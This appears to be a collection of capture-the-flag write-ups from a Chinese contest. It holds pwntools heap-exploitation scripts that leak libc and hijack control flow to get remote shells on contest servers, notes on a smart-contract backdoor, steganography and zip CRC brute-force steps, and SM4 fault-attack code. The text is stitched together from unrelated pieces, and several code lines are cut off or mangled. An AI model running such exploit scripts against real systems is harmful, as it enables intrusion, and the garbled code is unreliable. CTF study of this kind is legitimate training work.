#p = process('./babynotes')
p=remote("123.56.170.202", 43121)
name = "aa"
motto = "aaaa"
age =1234
def init(name,motto,age):
      p.sendafter(": \n",name)
      p.sendafter(": \n",motto)
      p.sendlineafter(": \n",str(age))
def add(index,size):
    p.sendlineafter(">> ","1")
    p.sendlineafter(": \n",str(index))
    p.sendlineafter(": \n",str(size))
def show(index):
    p.sendlineafter(">> ","2")
    p.sendlineafter(": \n",str(index))
def delete(index):
    p.sendlineafter(">> ","3")
    p.sendlineafter(": \n",str(index))
def edit(index,note):
    p.sendlineafter(">> ","4")
    p.sendlineafter(": \n",str(index))
    p.sendafter(": \n",note)
def reg(name,motto,age):
    p.sendlineafter(">> ","5")
    init(name,motto,age)
init("aaaaa","aaaaa",12)
add(0,0x18)
add(1,0xf8)
add(2,0x68)
add(3,0x20)
delete(0)
Just_a_Galgame
区块链
reg("a"*0x18,"a"*0x10,0x171)
delete(1)
add(4,0xf8)
add(1,0x68)
show(1)
p.recvuntil(": ")
addr=u64(p.recv(6)+"\x00\x00")+0x7ffff7a0d000-0x7ffff7dd1b78
print hex(addr)
delete(2)
edit(1,p64(addr+0x7ffff7dd1aed-0x7ffff7a0d000))
add(2,0x68)
add(0,0x68)
delete(2)
edit(0,"a"*0x13+p64(addr+0xf1207))
add(2,0x68)
#gdb.attach(p)
p.interactive()
from pwn import *
context.log_level="debug"
#p=process("./Just_a_Galgame")
p=remote("123.56.170.202",52114)
def add():
    p.sendlineafter(">> ","1")
def edit(index,note):
    p.sendlineafter(">> ","2")
    p.sendlineafter(">> ",str(index))
    p.sendafter(">> ",note)
def add2():
    p.sendlineafter(">> ","3")
def show(index):
    p.sendlineafter(">> ","4")
    p.sendlineafter(">> ",str(index))
def leave(note):
    p.sendlineafter(">> ","5")
    p.sendafter("\n\n",note)
add()
leave(p64(0x404000))
edit(8,p64(0x0403FD8))
show(0)
p.recvuntil("0: ")
addr=u64(p.recv(6)+"\x00\x00")-0x7ffff7af4180+0x7ffff79e4000
print hex(addr)
add2()
leave(p64(addr+0x03ebc30-0x60))
edit(8,p64(addr+0x10a45c))
#gdb.attach(p)
add()
p.interactive()
EasyFake
我部署的：
和RWCTF 2018 Final的题基本一样... 0x2665f77d是个backdoor.
pragma solidity ^0.4.23;
contract EasyFake {
...................
...................
string public constant hello = "Welcome to S4 of qwb! Enjoy yourself :D";
uint private constant randomNumber = 0;
event SendFlag(address addr);
...................
...................
kDGCcGie+3ujXBYOR0buPn4HYLoaDXsdR8QAw2NuuJem8wKdt/e99bQkDT7PJUALCXfx0B/yoB9YUTF9
Y7Ny7aLpcMDLR5qMGKVKEQ8wuZNk84m5E2zpIBWsHYwjgHFBgO6Lo8Og7Ag3f277UfzoLTtL7iO4HyPk
vvsHKpwOLHs=
new token: 
BoyCMgAMJYKuXC4wJ0M17bNSni4MPy5CDxLBlAmO0itHtrigRbgdBvsLuEC36G/GFrEH3nEEJcAx1wYF
if6PAPLncZ9YFshLSsHsI4cxc/L3ry6I9TBPsK+9mROttYcHRsqPyf3Qqi67c1qcjqjM+zoeJw4VLrM2
sWj+C1t7t69/Xhd7FLj5aJG1hDCoD0kK0u6EzunWacWlq3ALBSNrnw==
0xF2871Ea6f7463BcdBfcfa42939D26BC6719D86ED
https://ropsten.etherscan.io/address/0x801872e155f82fb1fdd350fff70c99d61ecf940a
const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const fs = require('fs');
const WalletProvider = require("truffle-wallet-provider");
const contract = "0xAa67957a992100674f70Af8EfD89E138C77A6308";
const mine = '0x9Fd6Bd7F75fB554A206dFa952cCa508d07e974C8';
const backdoor = "0x2665f77d";
String.prototype.trim = function() {
    return String(this).replace(/^\s+|\s+$/g, '');
};
String.prototype.leftJustify = function( length, char ) {
    var fill = [];
    while ( fill.length + this.length  res.jpg
按照相同分块方式上传即可拿到hash
pic2:
添加0x12 0x20的算法、长度标识后转为base58即可。
最后根据图片内容ﬂag=ﬂag{md5(hash1+hash2)} 拼接即可。
}).then(console.log);
pragma solidity ^0.4.23;
contract Sender {
    address private owner;
    uint public balance;
  event SendFlag(address addr);
    constructor () public {
        owner = msg.sender;
        balance = 0;
    }
    function pay() public payable {
        balance += msg.value;
    }
  function getflag() public payable {
    emit SendFlag(owner);
  }
    function kill() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}
ipfs add -s size-26624 res.jpg
added QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7 res.jpg
Misc
miscstudy
http://39.99.247.28/fonts/1
直接用wireshark导入上面链接的log可以解开另一个http请求
https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png
有几段base64解出来有个3600位的奇怪的01串
后面还有另一个base64解出来是
3600位的01串是二维码扫出来的连接
链接：https://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug提取码：1lms
stegdetect检测到steghide，用jphs解一下，爆破弱口令密码得到：power123
mac下面the unarchiver直接解开压缩包，拿到level5_is_aaa
flag{level1_begin_and_level2_is_come
level3_start_it
    https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
    mrpt
    level4_here_all
python crack.py level6.zip
reading zip files...
file found: level6.zip / 2.txt: crc = 0xeed7e184, size = 4
file found: level6.zip / 3.txt: crc = 0x289585af, size = 5
file found: level6.zip / 1.txt: crc = 0x9aeacc13, size = 5
compiling...
searching...
crc found: 0xeed7e184: "6_is"
crc found: 0x9aeacc13: "level"
crc found: 0x289585af: "n*=em"
crc found: 0x9aeacc13: "p**dx"
crc found: 0x289585af: "ready"
crc found: 0x9aeacc13: "M;f\x0c "
crc found: 0x289585af: "Ot-\x0c!"
crc found: 0x9aeacc13: "Qt:\x0d4"
crc found: 0x289585af: "S;q\x0d5"
crc found: 0x289585af: "?H\x5c\x09q"
done
level6.zip / 2.txt : '6_is'
level6.zip / 3.txt : 'n*=em'
level6.zip / 3.txt : 'ready'
level6.zip / 3.txt : 'Ot-\x0c!'
level6.zip / 3.txt : 'S;q\r5'
level6.zip / 3.txt : '?H\\\tq'
7.zip已知明文攻击拿到两张尺寸相同的图片，diﬀ一下根据pattern猜测使用了盲水印，解开拿到
level7ishere和39.99.247.28/ﬁnal_level
访问查看源码看到一个hint，另外前几行末尾包含多余空格和tab，猜测使用了snow隐写
Crypto
fault
sm4 fault attack
论文很多，有一篇有代码的
（https://github.com/guojuntang/sm4_dfa/blob/master/sm4_dfa.py），是random fault attack，
我们的条件更宽松，但限制了不能攻击最后一轮。
直接复用他的代码拿到ﬂag。
level6.zip / 1.txt : 'level'
level6.zip / 1.txt : 'p**dx'
level6.zip / 1.txt : 'M;f\x0c '
level6.zip / 1.txt : 'Qt:\r4'
level6_isready
./snow -C -p "no one can find me" index.html
the_misc_examaaaaaaa_!!!}
拼起来
flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaal
evel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}
import random
from enum import Enum
from pwn import *
import fuckpy3
import itertools
context.log_level = 'debug'
FaultStatus = Enum('FaultStatus', 'Crash Loop NoFault MinorFault MajorFault 
WrongFault round31Fault round30Fault round29Fault')
blockSize = 16
sliceSize = blockSize // 4
def xor(a, b): return list(map(lambda x, y: x ^ y, a, b))
def rotl(x, n): return ((x > (32 - n)) & 0xffffffff)
def get_uint32_be(key_data): return ((key_data[0] > 24) & 0xff), ((n >> 16) & 0xff), ((n >> 8) 
& 0xff), ((n) & 0xff)]
def bytes_to_list(data): return [i for i in data]
def list_to_bytes(data): return b''.join([bytes((i,)) for i in data])
def dump_byte(a): return print(''.join(map(lambda x: ('/x' if len(hex(x)) >= 4 
else '/x0')+hex(x)[2:], a)))
def l_inv(c): return c ^ rotl(c, 2) ^ rotl(c, 4) ^ rotl(c, 8) ^ rotl(c, 12) ^ 
rotl(
c, 14) ^ rotl(c, 16) ^ rotl(c, 18) ^ rotl(c, 22) ^ rotl(c, 24) ^ rotl(c, 30)
def int2bytes(state, size): return (state).to_bytes(size, byteorder='big', 
signed=False)
def bytes2int(state): return int.from_bytes(state, 'big', signed=False)